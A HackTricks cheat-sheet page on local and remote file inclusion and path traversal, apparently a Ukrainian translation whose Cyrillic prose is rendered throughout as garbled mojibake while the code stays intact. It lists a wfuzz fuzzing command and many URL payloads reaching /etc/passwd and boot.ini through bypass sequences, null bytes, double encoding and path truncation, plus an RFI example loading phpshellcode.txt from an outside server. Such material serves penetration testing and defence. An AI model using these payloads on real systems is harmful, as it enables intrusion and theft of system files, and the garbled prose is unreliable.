# –í–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤/–¢—Ä–∞–≤–µ—Ä—Å—ñ—è —à–ª—è—Ö—ñ–≤

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), —â–æ–± —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –¥–æ—Å–≤—ñ–¥—á–µ–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ —Ç–∞ –º–∏—Å–ª–∏–≤—Ü—è–º–∏ –∑–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—è–º–∏!

**–Ü–Ω—Å–∞–π—Ç–∏ —â–æ–¥–æ —Ö–∞–∫—ñ–Ω–≥—É**\
–í–∑–∞—î–º–æ–¥—ñ–π—Ç–µ –∑ –∫–æ–Ω—Ç–µ–Ω—Ç–æ–º, —è–∫–∏–π –¥–æ—Å–ª—ñ–¥–∂—É—î –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–ª–∏–∫–∏ —Ö–∞–∫—ñ–Ω–≥—É

**–ù–æ–≤–∏–Ω–∏ –ø—Ä–æ —Ö–∞–∫—ñ–Ω–≥ —É —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ —à–≤–∏–¥–∫–æ–∑–º—ñ–Ω–Ω–æ–≥–æ —Å–≤—ñ—Ç—É —Ö–∞–∫—ñ–Ω–≥—É –∑–∞–≤–¥—è–∫–∏ –Ω–æ–≤–∏–Ω–∞–º —Ç–∞ —ñ–Ω—Å–∞–π—Ç–∞–º —É —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ

**–û—Å—Ç–∞–Ω–Ω—ñ –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ –Ω–∞–π–Ω–æ–≤—ñ—à–∏—Ö –∑–∞–ø—É—Å–∫—ñ–≤ –±–∞–≥—ñ–≤ —Ç–∞ –≤–∞–∂–ª–∏–≤–∏—Ö –æ–Ω–æ–≤–ª–µ–Ω—å –ø–ª–∞—Ç—Ñ–æ—Ä–º–∏

**–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞** [**Discord**](https://discord.com/invite/N3FrSbmwdy) —Ç–∞ –ø–æ—á–Ω—ñ—Ç—å —Å–ø—ñ–≤–ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ –Ω–∞–π–∫—Ä–∞—â–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ –≤–∂–µ —Å—å–æ–≥–æ–¥–Ω—ñ!

## –í–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤

**–í—ñ–¥–¥–∞–ª–µ–Ω–µ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ (RFI):** –§–∞–π–ª –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è –∑ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞ (–Ω–∞–π–∫—Ä–∞—â–µ: –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç–∏ –∫–æ–¥, —ñ —Å–µ—Ä–≤–µ—Ä –≤–∏–∫–æ–Ω–∞—î –π–æ–≥–æ). –£ php —Ü–µ **–≤–∏–º–∫–Ω–µ–Ω–æ** –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º (**allow\_url\_include**).\
**–õ–æ–∫–∞–ª—å–Ω–µ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ (LFI):** –°–µ—Ä–≤–µ—Ä –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î –ª–æ–∫–∞–ª—å–Ω–∏–π —Ñ–∞–π–ª.

–í—Ä–∞–∑–ª–∏–≤—ñ **—Ñ—É–Ω–∫—Ü—ñ—ó PHP**: require, require\_once, include, include\_once

–¶—ñ–∫–∞–≤–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## –°–ª—ñ–ø–µ - –¶—ñ–∫–∞–≤—ñ - –§–∞–π–ª–∏ LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**–ó–º—ñ—à–∞–≤—à–∏ –∫—ñ–ª—å–∫–∞ —Å–ø–∏—Å–∫—ñ–≤ LFI –¥–ª—è \*nix —Ç–∞ –¥–æ–¥–∞–≤—à–∏ –±—ñ–ª—å—à–µ —à–ª—è—Ö—ñ–≤, —è —Å—Ç–≤–æ—Ä–∏–≤ —Ü–µ–π:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

–°–ø—Ä–æ–±—É–π—Ç–µ —Ç–∞–∫–æ–∂ –∑–∞–º—ñ–Ω–∏—Ç–∏ `/` –Ω–∞ `\`\
–°–ø—Ä–æ–±—É–π—Ç–µ —Ç–∞–∫–æ–∂ –¥–æ–¥–∞—Ç–∏ `../../../../../`

–°–ø–∏—Å–æ–∫, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∫—ñ–ª—å–∫–∞ —Ç–µ—Ö–Ω—ñ–∫ –¥–ª—è –ø–æ—à—É–∫—É —Ñ–∞–π–ª—É /etc/password (—â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ), –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

–û–±'—î–¥–Ω–∞–Ω–Ω—è —Ä—ñ–∑–Ω–∏—Ö —Å–ø–∏—Å–∫—ñ–≤ —Å–ª—ñ–≤:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

–°–ø—Ä–æ–±—É–π—Ç–µ —Ç–∞–∫–æ–∂ –∑–∞–º—ñ–Ω–∏—Ç–∏ `/` –Ω–∞ `\`\
–°–ø—Ä–æ–±—É–π—Ç–µ —Ç–∞–∫–æ–∂ –≤–∏–¥–∞–ª–∏—Ç–∏ `C:/` —Ç–∞ –¥–æ–¥–∞—Ç–∏ `../../../../../`

–°–ø–∏—Å–æ–∫, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∫—ñ–ª—å–∫–∞ —Ç–µ—Ö–Ω—ñ–∫ –¥–ª—è –ø–æ—à—É–∫—É —Ñ–∞–π–ª—É /boot.ini (—â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ), –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Å–ø–∏—Å–æ–∫ LFI –¥–ª—è Linux.

## –ë–∞–∑–æ–≤–∏–π LFI —Ç–∞ –æ–±—Ö—ñ–¥–Ω—ñ —à–ª—è—Ö–∏

–£—Å—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ —Å—Ç–æ—Å—É—é—Ç—å—Å—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤, –∞–ª–µ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω—ñ —Ç–∞–∫–æ–∂ –¥–æ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ (—Å—Ç–æ—Ä—ñ–Ω–∫–∞=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç—ñ –æ–±—Ö–æ–¥—É –≤–∏–¥–∞–ª–µ–Ω–æ –Ω–µ—Ä–µ–∫—É—Ä—Å–∏–≤–Ω–æ
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **–ù—É–ª—å–æ–≤–∏–π –±–∞–π—Ç (%00)**

–û–±—ñ–π–¥—ñ—Ç—å –¥–æ–¥–∞–≤–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö —Å–∏–º–≤–æ–ª—ñ–≤ –≤ –∫—ñ–Ω—Ü—ñ –Ω–∞–¥–∞–Ω–æ–≥–æ —Ä—è–¥–∫–∞ (–æ–±—Ö—ñ–¥: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
–¶–µ **–≤–∏—Ä—ñ—à–µ–Ω–æ –∑ PHP 5.4**

### **–ö–æ–¥—É–≤–∞–Ω–Ω—è**

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ñ –∫–æ–¥—É–≤–∞–Ω–Ω—è, —Ç–∞–∫—ñ —è–∫ –ø–æ–¥–≤—ñ–π–Ω–µ URL-–∫–æ–¥—É–≤–∞–Ω–Ω—è (—ñ —ñ–Ω—à—ñ):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### –ó —ñ—Å–Ω—É—é—á–æ—ó –ø–∞–ø–∫–∏

–ú–æ–∂–ª–∏–≤–æ, back-end –ø–µ—Ä–µ–≤—ñ—Ä—è—î —à–ª—è—Ö –¥–æ –ø–∞–ø–∫–∏:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### –î–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è –∫–∞—Ç–∞–ª–æ–≥—ñ–≤ —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ

–§–∞–π–ª–æ–≤—É —Å–∏—Å—Ç–µ–º—É —Å–µ—Ä–≤–µ—Ä–∞ –º–æ–∂–Ω–∞ –¥–æ—Å–ª—ñ–¥–∂—É–≤–∞—Ç–∏ —Ä–µ–∫—É—Ä—Å–∏–≤–Ω–æ –¥–ª—è –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –∫–∞—Ç–∞–ª–æ–≥—ñ–≤, –∞ –Ω–µ –ª–∏—à–µ —Ñ–∞–π–ª—ñ–≤, –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–µ–≤–Ω–∏—Ö —Ç–µ—Ö–Ω—ñ–∫. –¶–µ–π –ø—Ä–æ—Ü–µ—Å –≤–∫–ª—é—á–∞—î –≤ —Å–µ–±–µ –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –≥–ª–∏–±–∏–Ω–∏ –∫–∞—Ç–∞–ª–æ–≥—É —Ç–∞ –≤–∏—è–≤–ª–µ–Ω–Ω—è –Ω–∞—è–≤–Ω–æ—Å—Ç—ñ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –ø–∞–ø–æ–∫. –ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω–æ –¥–µ—Ç–∞–ª—å–Ω–∏–π –º–µ—Ç–æ–¥ –¥–æ—Å—è–≥–Ω–µ–Ω–Ω—è —Ü—å–æ–≥–æ:

1. **–í–∏–∑–Ω–∞—á–µ–Ω–Ω—è –≥–ª–∏–±–∏–Ω–∏ –∫–∞—Ç–∞–ª–æ–≥—É:** –í–∏–∑–Ω–∞—á—Ç–µ –≥–ª–∏–±–∏–Ω—É –ø–æ—Ç–æ—á–Ω–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É, —É—Å–ø—ñ—à–Ω–æ –æ—Ç—Ä–∏–º–∞–≤—à–∏ —Ñ–∞–π–ª `/etc/passwd` (–∑–∞—Å—Ç–æ—Å–æ–≤–Ω–æ, —è–∫—â–æ —Å–µ—Ä–≤–µ—Ä –±–∞–∑—É—î—Ç—å—Å—è –Ω–∞ Linux). –ü—Ä–∏–∫–ª–∞–¥ URL –º–æ–∂–µ –º–∞—Ç–∏ —Ç–∞–∫—É —Å—Ç—Ä—É–∫—Ç—É—Ä—É, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ –≥–ª–∏–±–∏–Ω—É —Ç—Ä–∏:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø–∞–ø–æ–∫:** –î–æ–¥–∞–π—Ç–µ –Ω–∞–∑–≤—É –ø—ñ–¥–æ–∑—Ä—ñ–ª–æ—ó –ø–∞–ø–∫–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `private`) –¥–æ URL-–∞–¥—Ä–µ—Å–∏, –∞ –ø–æ—Ç—ñ–º –ø–µ—Ä–µ–π–¥—ñ—Ç—å –Ω–∞–∑–∞–¥ –¥–æ `/etc/passwd`. –î–æ–¥–∞—Ç–∫–æ–≤–∏–π —Ä—ñ–≤–µ–Ω—å –∫–∞—Ç–∞–ª–æ–≥—É –≤–∏–º–∞–≥–∞—î –∑–±—ñ–ª—å—à–µ–Ω–Ω—è –≥–ª–∏–±–∏–Ω–∏ –Ω–∞ –æ–¥–∏–Ω–∏—Ü—é:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **–Ü–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ü—ñ—è —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ–≤:** –í—ñ–¥–ø–æ–≤—ñ–¥—å —Å–µ—Ä–≤–µ—Ä–∞ –≤–∫–∞–∑—É—î –Ω–∞ —Ç–µ, —á–∏ —ñ—Å–Ω—É—î –ø–∞–ø–∫–∞:
* **–ü–æ–º–∏–ª–∫–∞ / –ù–µ–º–∞—î –≤–∏–≤–æ–¥—É:** –ô–º–æ–≤—ñ—Ä–Ω–æ, –ø–∞–ø–∫–∞ `private` –Ω–µ —ñ—Å–Ω—É—î –∑–∞ –≤–∫–∞–∑–∞–Ω–æ—é ‚Äã‚Äã–∞–¥—Ä–µ—Å–æ—é.
* **–í–º—ñ—Å—Ç `/etc/passwd`:** –ü—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–æ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –ø–∞–ø–∫–∏ `private`.
4. **–†–µ–∫—É—Ä—Å–∏–≤–Ω–µ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è:** –í–∏—è–≤–ª–µ–Ω—ñ –ø–∞–ø–∫–∏ –º–æ–∂–Ω–∞ –ø–æ–¥–∞–ª—å—à–µ –¥–æ—Å–ª—ñ–¥–∂—É–≤–∞—Ç–∏ –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç –ø—ñ–¥–∫–∞—Ç–∞–ª–æ–≥—ñ–≤ –∞–±–æ —Ñ–∞–π–ª—ñ–≤, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç—É –∂ —Ç–µ—Ö–Ω—ñ–∫—É –∞–±–æ —Ç—Ä–∞–¥–∏—Ü—ñ–π–Ω—ñ –º–µ—Ç–æ–¥–∏ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ (LFI).

–î–ª—è –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è –∫–∞—Ç–∞–ª–æ–≥—ñ–≤ —É —Ä—ñ–∑–Ω–∏—Ö –º—ñ—Å—Ü—è—Ö —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –Ω–∞–ª–∞—à—Ç—É–π—Ç–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –º—ñ—Å—Ç–∏—Ç—å `/var/www/` –∫–∞—Ç–∞–ª–æ–≥ `private` (–ø—Ä–∏–ø—É—Å–∫–∞—é—á–∏, —â–æ –ø–æ—Ç–æ—á–Ω–∏–π –∫–∞—Ç–∞–ª–æ–≥ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –Ω–∞ –≥–ª–∏–±–∏–Ω—ñ 3), –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **–¢–µ—Ö–Ω—ñ–∫–∞ –æ–±—Ä—ñ–∑–∞–Ω–Ω—è —à–ª—è—Ö—É**

–û–±—Ä—ñ–∑–∞–Ω–Ω—è —à–ª—è—Ö—É - —Ü–µ –º–µ—Ç–æ–¥, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è —Ñ–∞–π–ª–æ–≤–∏–º–∏ —à–ª—è—Ö–∞–º–∏ –≤ –≤–µ–±-–¥–æ–¥–∞—Ç–∫–∞—Ö. –ß–∞—Å—Ç–æ –≤—ñ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –æ–±–º–µ–∂–µ–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ —à–ª—è—Ö–æ–º –æ–±—Ö—ñ–¥–Ω–∏—Ö –∑–∞—Ö–æ–¥—ñ–≤ –±–µ–∑–ø–µ–∫–∏, —è–∫—ñ –¥–æ–¥–∞—é—Ç—å –¥–æ–¥–∞—Ç–∫–æ–≤—ñ —Å–∏–º–≤–æ–ª–∏ –≤ –∫—ñ–Ω–µ—Ü—å —Ñ–∞–π–ª–æ–≤–∏—Ö —à–ª—è—Ö—ñ–≤. –ú–µ—Ç–∞ –ø–æ–ª—è–≥–∞—î –≤ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ —Ñ–∞–π–ª–æ–≤–æ–≥–æ —à–ª—è—Ö—É, —è–∫–∏–π, –ø—ñ—Å–ª—è –∑–º—ñ–Ω–∏ –∑–∞—Ö–æ–¥—É –±–µ–∑–ø–µ–∫–∏, –≤—Å–µ —â–µ –≤–∫–∞–∑—É—î –Ω–∞ –±–∞–∂–∞–Ω–∏–π —Ñ–∞–π–ª.

–£ PHP —Ä—ñ–∑–Ω—ñ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω—è —Ñ–∞–π–ª–æ–≤–æ–≥–æ —à–ª—è—Ö—É –º–æ–∂—É—Ç—å –≤–≤–∞–∂–∞—Ç–∏—Å—è –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–Ω–∏–º–∏ —á–µ—Ä–µ–∑ –ø—Ä–∏—Ä–æ–¥—É —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` —Ç–∞ `/etc/passwd/` —Ä–æ–∑–≥–ª—è–¥–∞—é—Ç—å—Å—è —è–∫ –æ–¥–∏–Ω —ñ —Ç–æ–π –∂–µ —à–ª—è—Ö.
* –ö–æ–ª–∏ –æ—Å—Ç–∞–Ω–Ω—ñ 6 —Å–∏–º–≤–æ–ª—ñ–≤ - `passwd`, –¥–æ–¥–∞–≤–∞–Ω–Ω—è `/` (—Ä–æ–±–ª—è—á–∏ –π–æ–≥–æ `passwd/`) –Ω–µ –∑–º—ñ–Ω—é—î —Ü—ñ–ª—å–æ–≤–æ–≥–æ —Ñ–∞–π–ª—É.
* –¢–∞–∫ —Å–∞–º–æ, —è–∫—â–æ –¥–æ —Ñ–∞–π–ª–æ–≤–æ–≥–æ —à–ª—è—Ö—É –¥–æ–¥–∞—Ç–∏ `.php` (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `shellcode.php`), –¥–æ–¥–∞–≤–∞–Ω–Ω—è `/.` –≤ –∫—ñ–Ω—Ü—ñ –Ω–µ –∑–º—ñ–Ω–∏—Ç—å –¥–æ—Å—Ç—É–ø–Ω–∏–π —Ñ–∞–π–ª.

–ù–∞–≤–µ–¥–µ–Ω—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ –¥–µ–º–æ–Ω—Å—Ç—Ä—É—é—Ç—å, —è–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –æ–±—Ä—ñ–∑–∞–Ω–Ω—è —à–ª—è—Ö—É –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ `/etc/passwd`, –∑–∞–≥–∞–ª—å–Ω–æ—ó —Ü—ñ–ª—ñ —á–µ—Ä–µ–∑ –π–æ–≥–æ —á—É—Ç–ª–∏–≤–∏–π –≤–º—ñ—Å—Ç (—ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
–£ —Ü–∏—Ö —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö –∫—ñ–ª—å–∫—ñ—Å—Ç—å –ø–æ—Ç—Ä—ñ–±–Ω–∏—Ö –ø–µ—Ä–µ—Ö–æ–¥—ñ–≤ –º–æ–∂–µ —Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –±–ª–∏–∑—å–∫–æ 2027, –∞–ª–µ —Ü—è –∫—ñ–ª—å–∫—ñ—Å—Ç—å –º–æ–∂–µ –≤–∞—Ä—ñ—é–≤–∞—Ç–∏—Å—è –≤ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤—ñ–¥ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Å–µ—Ä–≤–µ—Ä–∞.

* **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∫—Ä–∞–ø–∫–æ–≤–∏—Ö —Å–µ–≥–º–µ–Ω—Ç—ñ–≤ —Ç–∞ –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö —Å–∏–º–≤–æ–ª—ñ–≤**: –ü–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç—ñ –ø–µ—Ä–µ—Ö–æ–¥—ñ–≤ (`../`), –ø–æ—î–¥–Ω–∞–Ω—ñ –∑ –¥–æ–¥–∞—Ç–∫–æ–≤–∏–º–∏ –∫—Ä–∞–ø–∫–æ–≤–∏–º–∏ —Å–µ–≥–º–µ–Ω—Ç–∞–º–∏ —Ç–∞ —Å–∏–º–≤–æ–ª–∞–º–∏, –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –Ω–∞–≤—ñ–≥–∞—Ü—ñ—ó –ø–æ —Ñ–∞–π–ª–æ–≤—ñ–π —Å–∏—Å—Ç–µ–º—ñ, –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ —ñ–≥–Ω–æ—Ä—É—é—á–∏ –¥–æ–¥–∞–Ω—ñ —Ä—è–¥–∫–∏ —Å–µ—Ä–≤–µ—Ä–æ–º.
* **–í–∏–∑–Ω–∞—á–µ–Ω–Ω—è –ø–æ—Ç—Ä—ñ–±–Ω–æ—ó –∫—ñ–ª—å–∫–æ—Å—Ç—ñ –ø–µ—Ä–µ—Ö–æ–¥—ñ–≤**: –®–ª—è—Ö–æ–º –≤–∏–ø—Ä–æ–±—É–≤–∞–Ω—å –º–æ–∂–Ω–∞ –≤–∏–∑–Ω–∞—á–∏—Ç–∏ —Ç–æ—á–Ω—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç–µ–π `../`, –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏—Ö –¥–ª—è –Ω–∞–≤—ñ–≥–∞—Ü—ñ—ó –¥–æ –∫–æ—Ä–µ–Ω–µ–≤–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É, –∞ –ø–æ—Ç—ñ–º –¥–æ `/etc/passwd`, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏ –Ω–µ–π—Ç—Ä–∞–ª—ñ–∑–∞—Ü—ñ—é –±—É–¥—å-—è–∫–∏—Ö –¥–æ–¥–∞–Ω–∏—Ö —Ä—è–¥–∫—ñ–≤ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `.php`), –∞–ª–µ –±–∞–∂–∞–Ω–∏–π —à–ª—è—Ö (`/etc/passwd`) –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è –Ω–µ–¥–æ—Ç–æ—Ä–∫–∞–Ω–∏–º.
